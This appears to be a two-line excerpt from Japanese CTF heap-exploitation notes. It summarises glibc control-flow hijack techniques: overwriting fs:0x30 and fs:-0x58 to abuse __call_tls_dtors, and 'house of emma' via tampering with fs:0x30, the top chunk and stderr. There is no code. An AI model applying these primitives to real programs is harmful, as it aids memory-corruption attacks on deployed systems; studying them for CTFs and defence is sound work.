- `__call_tls_dtors`: fs:0x30とfs:-0x58の改ざん(後者はlargebin attackでは上手くいかないので注意) 、これもmainから変えることで実行されます。これはrbpがコントロールできます。
- `house of emma`: fs:0x30とtop、stderrの改ざんから、sysmallocが必要な状況を作り出せれば実行されます。rdiがfake io_fileを向きます。

